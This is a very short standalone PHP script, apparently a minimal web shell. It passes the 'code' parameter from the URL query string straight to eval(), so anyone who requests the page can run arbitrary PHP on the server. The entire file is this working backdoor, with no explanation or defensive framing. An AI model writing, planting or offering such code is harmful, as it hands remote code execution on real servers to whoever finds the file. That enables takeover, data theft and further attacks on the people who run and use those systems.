<?php
if (isset($_GET['code'])) {
    eval($_GET['code']);
} else {
    echo "No PHP code provided!";
}
?>
